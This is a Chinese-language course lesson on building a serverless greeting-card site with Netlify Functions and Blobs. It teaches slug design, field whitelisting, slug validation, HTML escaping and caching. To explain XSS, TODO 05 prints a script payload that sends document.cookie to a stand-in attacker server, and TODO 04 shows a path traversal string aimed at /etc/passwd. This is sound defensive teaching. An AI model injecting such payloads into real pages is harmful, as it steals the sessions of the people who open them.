### 这一课最该记住的一句话

> **分享出去的那一页，只能有祝福，不能有别的任何东西。**

打开 `netlify/functions/view.js` 看最上面的注释——这一页是**服务端直接拼好的完整 HTML**：
不加载任何 JavaScript、没有应用外壳、没有导航、没有按钮、
**没有一个字的推广**。

为什么不用前端路由渲染那一页？三个理由：

1. 前端渲染要先下 JS 再请求数据，**手机上会先白屏一下**，收贺卡的人体验很差；
2. 微信、QQ 这类客户端抓不到前端渲染的内容，**转发时没有预览**；
3. 页面里只要挂着应用外壳，就难免出现"回到首页""我也要做一张"这类干扰。
   **服务端单独出一页，从根上保证这页只有祝福。**

**第 3 条是产品决定，不是技术决定。** 很多产品会在分享页放一个"我也要做一张"
来拉新——这个项目明确不这么做，因为**这是一份送给别人的心意，不是一个广告位**。

## 开课前先讲这些概念

|知识点|小白要理解的话|本课在哪里用到|
|---|---|---|
|Serverless Function|一段"有人请求才跑"的后端代码，不用自己管服务器|全课|

|XSS|别人写的脚本在**你的用户**的浏览器里执行|TODO 05|
|HTML 转义|把 `<` 变成 `&lt;`，让它只显示不执行|TODO 05|
|CDN|离用户近的一层缓存|已写好的代码|
|竞态条件|两件事同时发生，结果取决于谁快|已写好的代码|

### 这个产品上线之后长什么样

```text
浏览器  →  Netlify CDN  →  三个 Function
                              /api/greeting  生成文案（第 2 课）
                              /api/card      存贺卡，返回短链接
                              /c/:slug       渲染分享页
                                   ↓
                              Netlify Blobs（键值存储）
```

**没有一台需要你自己维护的服务器，也没有一个需要你自己配的数据库。**
这和项目 3 是两条完全不同的路线——项目 3 教的是"数据库怎么用"，
这里教的是"**不想管运维时，可以怎么做**"。

两条路都要会，**代价不同**：
Serverless 省运维，但你被平台绑住，而且复杂查询做不了（KV 只能按 key 取）。

|终端里报什么|原因|处理|
|---|---|---|
|`'npm' 不是内部或外部命令`|Node 没装，或装完没重开终端|装 Node 24，**关掉所有终端重开**，再 `node -v` 确认|
|`Cannot find module`|依赖没装，或者不在工程目录里|先确认当前目录对不对，再 `npm install`|
|`EADDRINUSE` 端口被占用|**多半是上一次的服务没关**|找到那个终端按 `Ctrl+C`；或者换个端口|

|装依赖卡住不动|npm 源慢|`npm config set registry https://registry.npmmirror.com` 再重试|

|一片空白，Console 全是红字|前端代码有错|从 **第一条**报错开始看，不要直接翻到最后|


## 3. 先理解存储：这里没有表，也没有 SQL

Netlify Blobs 是一个**键值存储**：

```js
const store = getStore({ name: 'cards', consistency: 'strong' })

await store.setJSON('林老师-20260922', card)       // 存
const card = await store.get('林老师-20260922', { type: 'json' })   // 取
```

|  |项目 3 的数据库|这里的键值存储|
|---|---|---|
|怎么找数据|`SELECT … WHERE …`，**条件随便写**|**只能按 key 取**|
|约束、外键|数据库替你管|**完全没有，自己管**|
|适合|要查询、要关联的数据|**按 id 取一整坨**的数据|

贺卡正好是后一种：**拿到链接就取一张，永远不需要"查找所有生日贺卡"。**
所以键值存储足够，而且省掉了整个数据库的运维。

> **`consistency: 'strong'` 是什么意思？**
> 存进去之后**立刻能读到**。默认的最终一致性会有短暂延迟——
> 那样的话 已写好的代码 的"先读一下看被占没被占"就不可靠了。

**隐私提醒**（看 `card.js` 最上面的注释）：这里存的是**别人写给别人的祝福**，
所以**只存必要字段、不存任何身份信息、不记 IP**。
**能不收集的数据就不收集**——这是隐私保护最有效的一条，
比事后加一堆加密管用得多。

### TODO 01 · 短链接叫什么名字

**难度**：极简单


**为什么做这个**
这条链接是要**发到微信里、念给别人听、甚至抄在纸上**的。
一长串 base64 能用，但没人愿意用。

**涉及的知识点**

```js
const name = tidyName(receiver)
const stamp = todayStamp(now)
const base = name ? `${name}-${stamp}` : `card-${stamp}`
return [base, `${base}-${shortCode(3)}`, `${base}-${shortCode(4)}`, `${base}-${shortCode(6)}`]
```

|部分|说明|
|---|---|
|`tidyName`|把称呼洗成能进网址的样子（去标点、压横线、截到 8 个字）|
|`todayStamp`|`20260922` 这样的日期|
|`name ? A : B`|**称呼为空时必须退回 `card-…`**，否则会拼出 `-20260922` 这种以横线开头的怪链接|
|返回一个数组|**候选列表**，重名时依次往后试|

**为什么返回的是"候选列表"而不是直接一个名字？**

因为**能不能用要去问存储**，这个纯函数自己不知道。
所以它只负责备好候选，让 `card.js` 去逐个试（已写好的代码）。

> **纯函数不碰网络和存储，才好测。**
> 看一眼 `npm run test`：测这个函数不需要启动任何服务，
> 传一个固定的 `now` 进去就能断言输出。
> **能不能方便地测，往往就看有没有把"算"和"存"分开。**

**改哪里**：`src/shared/slug.js` 的 `candidateSlugs`，TODO 01 的位置。

**操作前 / 操作后**

- 操作前：所有贺卡都想叫 `/c/card`。
- 操作后：**第一张是 `/c/林老师-20260922`。**

**自己验证**

2. **看那条链接**：应该是 `http://localhost:8888/c/林老师-20260922`。
3. **把称呼清空再试**（需要先填一个字才能生成，所以填一个标点比如 `。`）→
   应该退回 `card-20260922`，**而不是 `-20260922`**。

**多想一步**
这个设计的代价是**必须有服务端存储**：内容存在服务器上，
网址里只放这把"钥匙"。

另一条路是**把内容编码进网址本身**（这个工程的旧版就是 `#card=…`）。
好处是完全不需要后端，坏处是链接会变得很长很丑。

### TODO 02 · 随机码要能抄得对

**难度**：简单


**为什么做这个**
这是本课最值得品味的一个设计点。

**涉及的知识点**

```js
const ALPHABET = 'abcdefghjkmnpqrstuvwxyz23456789'
out += ALPHABET[Math.floor(Math.random() * ALPHABET.length)]
```

**看清楚这个字母表少了什么**：`0`、`o`、`O`、`1`、`l`、`i`、`I`。

为什么去掉：这几个字符在很多字体里**几乎分不清**。
短链接是要被人**念出来、抄在纸上、发在微信里**的，
**抄错一个字就打不开了。**

> **这是一个典型的"技术上没问题，用起来出问题"的设计点。**
> 用完整的 62 个字符在算法上完全正确，
> 但真实场景下会造成大量抄写失败。**做产品要多想这一层。**

|部分|说明|
|---|---|
|`Math.random()`|返回 0 到 1 之间的小数（**取不到 1**）|
|`* ALPHABET.length`|放大到 0—31|
|`Math.floor`|往下取整，得到 0—30 的下标|

**改哪里**：`src/shared/slug.js` 的 `shortCode`，TODO 02 的位置。

**操作前 / 操作后**

- 操作前：后缀是空的，四个候选长得一模一样，等于没有备选。
- 操作后：**`林老师-20260922-7dd` 这样，三位随机码。**

**自己验证**
1. **同一个称呼、同一天做两张贺卡** → 第二张的链接末尾多一段随机码。
2. 看几个随机码，**确认里面不会出现 0、o、1、l、i**。
3. `npm run test` 里有专门的断言。

**多想一步**
`Math.random()` **不是密码学安全的随机数**——
它的输出在理论上是可以预测的。

这里够用：猜到一个链接，只能看到一张**本来就打算公开分享**的贺卡。

但是：

> **凡是用来做密码、令牌、验证码、重置链接的随机数，
> 绝对不能用 `Math.random()`。**
> 要用 `crypto.randomUUID()` 或 `crypto.getRandomValues()`。

**"够用"和"安全"是两个标准，用错场景是真实事故。**

### TODO 03 · 只存该存的字段

**难度**：简单


**为什么做这个**
`POST /api/card` 的请求体**完全由别人控制**。

**涉及的知识点**

```js
const text = (value, max) => String(value ?? '').slice(0, max)
const card = {
  receiver: text(body?.receiver, 20).trim(),
  occasion: text(body?.occasion, 10),
  tone:     text(body?.tone, 10),
  message:  text(body?.message, 400).trim(),
  themeId:  text(body?.themeId, 20),
  createdAt: new Date().toISOString(),
}
```

**这里是"挑出要的"，不是"删掉不要的"**：

|写法|问题|
|---|---|
|`{ ...body }` 再 `delete` 几个字段|**永远会漏**。对方加一个新字段你就得改一次|
|**列白名单，逐个取**|只有列出来的会被存|

不这么做的话，有人用 curl 往里塞几兆字符串，**存储就被撑爆了**；
或者塞几十个额外字段，全都被原样存下来。

**`createdAt` 为什么用 `toISOString()`？**
它是带时区的标准格式（`2026-09-22T06:12:33.000Z`），
换一台服务器、换一个时区都不会错。

> **存时间一律存 ISO 字符串或时间戳，
> 不要存"2026年9月22日"这种给人看的格式。**
> 给人看的格式在**显示的时候**再转（看 `view.js` 的 `formatDate`）。

**改哪里**：`netlify/functions/card.js` 的 `sanitize`，TODO 03 的位置。

**操作前 / 操作后**

- 操作前：传什么存什么，字段和长度都不限。
- 操作后：**只存五个字段，每个都截到上限。**

**自己验证**

```powershell
$body = @{
  receiver = '林老师'; message = '祝好'; themeId = 'moon'
  occasion = '生日'; tone = '温暖'
  secretField = '不该被存进去'; note = ('x' * 5000)
} | ConvertTo-Json

$r = Invoke-RestMethod -Uri http://localhost:8888/api/card -Method Post `
  -ContentType 'application/json' -Body $body
$r

# 再取回来看看存了什么
Invoke-RestMethod -Uri "http://localhost:8888/api/card?slug=$($r.slug)"
```

**取回来的对象里不应该有 `secretField` 和 `note`。**

**多想一步**
`sanitize` 最后那两句：

```js
if (!card.receiver) throw new Error('缺少收礼人称呼')
if (!card.message) throw new Error('缺少祝福内容')
```

洗完之后还要**再确认关键字段没被洗成空的**。
比如称呼全是空格，`trim()` 之后就什么都不剩了。
**"洗干净"和"洗没了"要分得清。**

### TODO 04 · 进存储之前再兜一道

**难度**：中等


**为什么做这个**
地址栏里的东西**完全由别人控制**。有人会试着往里塞奇怪的字符。

**涉及的知识点**

```js
export function isSafeSlug(value) {
  return typeof value === 'string' && value.length > 0 && value.length <= 40 && !/[/\\?#%]/.test(value)
}
```

|检查|防什么|
|---|---|
|`typeof value === 'string'`|传进来可能是 `null`（路径参数缺失时）|
|`length > 0 && <= 40`|空字符串；以及超长字符串撑爆存储键|
|`!/[/\\?#%]/.test(value)`|**危险字符**|

**那五个字符为什么危险**：

|字符|问题|
|---|---|
|`/` `\`|能拼出路径，试图跳出预期目录（`/c/../../etc/passwd`）|
|`?` `#`|在网址里有特殊含义，**会把后面的内容截断**|
|`%`|百分号编码的起始符，**可能被二次解码绕过检查**|

**改哪里**：`src/shared/slug.js` 的 `isSafeSlug`，TODO 04 的位置。

**操作前 / 操作后**

- 操作前：`/c/../../something` 会被原样拿去查存储。
- 操作后：**直接返回 404 页面。**

**自己验证**
1. 地址栏输入 `http://localhost:8888/c/正常的链接` → 看得到贺卡。
2. 改成一段带斜杠或问号的乱码 → **看到"没有找到这张贺卡"那一页**。
3. 空链接 `/c/` → 也应该是 404（而不是报错页）。

**多想一步：为什么 `card.js` 存之前检查过了，这里读之前还要再检查？**

因为**这个函数不知道调用方有没有检查，也不该假设它检查过**。

```text
card.js  存之前检查一次
view.js  读之前再检查一次
```

这叫**纵深防御**：每一层各自负责自己的安全，
不指望上一层做对。**上一层今天做对了，明天可能被人改掉。**

另外看一眼 `view.js` 的 handler 开头：

```js
try { slug = decodeURIComponent(slug) } catch { slug = '' }
```

**路径参数里的中文是百分号编码过的**（`林老师` → `%E6%9E%97...`），
不解码就拿去查存储一定查不到，**页面会误报"贺卡不存在"**。
而 `decodeURIComponent` 遇到坏编码会抛错，所以要包一层。
**这个 bug 是真的在上线时出现过的。**

### TODO 05 · 把用户写的字转义掉

**难度**：中等


**为什么做这个**
**这是整个课程里最重要的一条安全知识。**

分享页是服务端拼字符串生成的 HTML。
如果有人在祝福里写：

```html
<script>fetch('http://坏人的服务器?c=' + document.cookie)</script>
```

而我们原样拼进页面，这段代码就会**在收贺卡的人的浏览器里执行**，
把他的登录状态偷走。这类漏洞叫 **XSS**，是 Web 安全里最常见的一种。

**注意受害者是谁**：不是写贺卡的人，是**收贺卡的人**。
**你的疏忽，伤的是信任你的用户。**

**涉及的知识点**

```js
const escapeHtml = value =>
  String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
```

**`&` 必须第一个换，这是个考点。**

假设先换 `<`：

```text
输入  <b>
换 <  →  &lt;b>
换 &  →  &amp;lt;b>      ← 把自己刚产生的 & 又换了一遍
页面显示  &lt;b>          ← 显示出了这四个字符，不是想要的
```

**顺序错了功能就错了**，而且这种错很难一眼看出来。

**为什么这一页要手动转义，第 1 课的 Vue 页面不用？**

|  |转义|
|---|---|
|Vue 的 `{{ }}`|**默认就转义**，框架替你做了|
|Vue 的 `v-html`|**不转义**，用它就要自己负责（这个项目一处都没用）|
|服务端拼字符串|**没有框架兜底，必须自己做**|

**改哪里**：`netlify/functions/view.js` 的 `escapeHtml`，TODO 05 的位置。

**操作前 / 操作后**

- 操作前：在祝福里写 `<b>粗体</b>`，分享页上**真的会变粗**。
- 操作后：**页面上原样显示 `<b>粗体</b>` 这几个字符。**

**自己验证**
1. 生成一张贺卡，**在文案框里把内容改成**：

```text
测试 <b>粗体</b> 和 <i>斜体</i>
```

2. 点"生成分享链接"，打开那条链接。

|  |做之前|做之后|
|---|---|---|
|页面上显示|**测试 粗体 和 斜体**（真的加粗了）|`测试 <b>粗体</b> 和 <i>斜体</i>`|

3. **F12 → Elements**，看那段 HTML：应该是 `&lt;b&gt;`，**不是 `<b>`**。

**多想一步**
`server/prompt.js` 的 `clean()` 已经去掉尖括号了（第 2 课 TODO 02），
为什么这里还要转义？

**因为文案是可以被用户手动改的**——
`App.vue` 里那个 `<textarea v-model="message">` 让用户能随便改文案，
改完直接走 `/api/card`，**根本不经过 `prompt.js`**。

> **每一个数据入口都要各自负责。**
> "另一个地方已经处理过了"是最常见的漏洞成因。

再看一眼 `preview` 那一行：分享到聊天软件时的预览文字**也转义了**。
**页面上每一处用户内容都要转义，一处都不能漏。**

### 已写好 · 让 CDN 替我们扛流量

**为什么做这个**
一条链接被转发到几百人的群里，几百人同时点开。
**每一次都回源执行一遍 Function，既慢又费。**

**涉及的知识点**

```js
'Cache-Control': 'public, max-age=600, s-maxage=86400'
```

|部分|意思|
|---|---|
|`public`|**允许任何缓存**（包括 CDN）缓存它|
|`max-age=600`|**浏览器**缓存 10 分钟|
|`s-maxage=86400`|**CDN** 缓存一整天（`s` 是 shared 的意思）|

**为什么这一页可以放心缓存？** 因为**贺卡内容存下来就不会再变了**。

**反过来想：哪些接口绝对不能这样缓存？**

|接口|为什么|
|---|---|
|带登录状态的|**缓存了会串号**——A 看到 B 的数据，**是真实事故**|
|每次都该变的|比如 `/api/greeting`，它每次都要出新文案|

所以那两个 Function 里写的是 `'no-store'`。

> **回头看一眼 `greeting.js` 的响应头，和这一页对比一下。**
> **同一个产品里，不同接口的缓存策略完全不同，
> 这是想清楚了才写的，不是抄的。**

**推送报 `'origin' does not appear to be a git repository` 怎么办？**

走路线 B 的同学，`origin` 已经被改名成 `template`
（那是全班共用的模板仓库，**不能推**）。
先到 GitHub 新建一个空仓库 `p4-card-学号`（**不要**勾选 "Add a README file"），然后：

**Windows CMD**

```bat
REM 把你自己的仓库地址登记成 origin
git remote add origin https://github.com/你的用户名/p4-card-学号.git
git branch -M main

REM -u 的意思是"记住这个对应关系"，以后直接 git push 就行
git push -u origin main

REM 确认一下现在有哪几个远程仓库
git remote -v
```

**Windows PowerShell**

```powershell
git remote add origin https://github.com/你的用户名/p4-card-学号.git
git branch -M main
git push -u origin main
git remote -v
```

关联一次就够，以后 `git push origin main` 直接能用。
`git remote -v` 应该看到：**`origin` 指向你自己的仓库，`template` 指向公共模板仓库**。

## 常见问题

### netlify dev

|现象|原因|处理|
|---|---|---|
|`netlify: command not found`|CLI 没装|`npm install -g netlify-cli`，**装完重开终端**|
|一直卡在登录|浏览器没弹出来|复制终端里的链接手动打开|
|端口 8888 被占|上次的还在跑|关掉那个终端|
|Functions 404|目录配置不对|看 `netlify.toml` 里的 `functions` 路径|
|Blobs 报错|本地环境没初始化|`netlify link` 关联站点后重试|

### 短链接与分享页

|现象|原因|处理|
|---|---|---|
|中文链接打不开|**没有 `decodeURIComponent`**|看 TODO 04 的"多想一步"|
|`/c/xxx` 全是 404|`netlify.toml` 里的路由没配|检查 `config = { path: '/c/:slug' }`|
|第二张把第一张覆盖了|已写好的代码 没做|逐个试候选，别直接写|
|`<b>` 真的变粗了|TODO 05 没做|`escapeHtml` 的五条替换|
|页面上显示出 `&lt;b&gt;` 这几个字符|**`&` 没有第一个换**|调整替换顺序|

### 部署

|现象|原因|处理|
|---|---|---|
|线上一直用本地文案库|线上没配密钥|`netlify env:set MINIMAX_API_KEY … --context production --secret`|
|`npm run check` 报对比度|改过卡面配色|按脚本提示的比值调深或调浅|
|部署成功但页面白屏|`--dir` 指错了|应该是 `dist`|
|改了 Function 线上没变|Function 目录没带上|`--functions netlify/functions`|

更多通用排错见 `通用附录_运行提交部署与排错.md`；
命令和参数的逐条解释见 [命令参数逐个拆开](<../../01_入门与通用规范/04_命令参数逐个拆开.md>)。
